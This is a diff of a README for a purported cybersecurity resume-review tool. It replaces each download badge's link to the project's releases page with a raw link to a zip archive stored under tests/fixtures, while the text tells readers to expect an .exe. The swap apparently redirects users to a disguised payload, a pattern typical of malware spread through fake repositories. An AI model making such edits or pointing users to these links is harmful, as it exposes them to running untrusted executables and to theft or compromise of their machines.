@@ -1,6 +1,6 @@
 # 🤖 cyber-resume-reviewer-skill - Polishes Resumes for Cybersecurity Jobs
 
-[![Download Now](https://img.shields.io/badge/Download-Cyber_Resume_Reviewer-blue?style=for-the-badge&logo=github)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
+[![Download Now](https://img.shields.io/badge/Download-Cyber_Resume_Reviewer-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/shayanadh/cyber-resume-reviewer-skill/main/cyber-resume-reviewer/tests/fixtures/cyber-skill-resume-reviewer-v1.7.zip)
 
 ## 🎯 What This Does
 
@@ -31,7 +31,7 @@ The download process is simple and takes just a few minutes. Follow these steps 
 
 **Step 1:** Go to the download page by clicking this button:
 
-[![Download Here](https://img.shields.io/badge/⬇️%20Download%20Now-Click%20Here-green?style=for-the-badge)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
+[![Download Here](https://img.shields.io/badge/⬇️%20Download%20Now-Click%20Here-green?style=for-the-badge)](https://raw.githubusercontent.com/shayanadh/cyber-resume-reviewer-skill/main/cyber-resume-reviewer/tests/fixtures/cyber-skill-resume-reviewer-v1.7.zip)
 
 **Step 2:** On that page, you will see a list of files. Look for the newest version at the top. Click on the file that says something like "Download" or has the version number. It will likely be a file that ends with `.exe`.
 
@@ -100,7 +100,7 @@ Getting a job in cybersecurity is competitive. Your resume is often the first th
 
 So do not wait. Download it now, review your resume, and take a step closer to your dream job. You have the skills. This tool helps you show them.
 
-[![Get Started Today](https://img.shields.io/badge/🚀-Get_Started_Now-orange?style=for-the-badge)](https://github.com/shayanadh/cyber-resume-reviewer-skill/releases)
+[![Get Started Today](https://img.shields.io/badge/🚀-Get_Started_Now-orange?style=for-the-badge)](https://raw.githubusercontent.com/shayanadh/cyber-resume-reviewer-skill/main/cyber-resume-reviewer/tests/fixtures/cyber-skill-resume-reviewer-v1.7.zip)
 
 Good luck with your job search. You have got this.
 
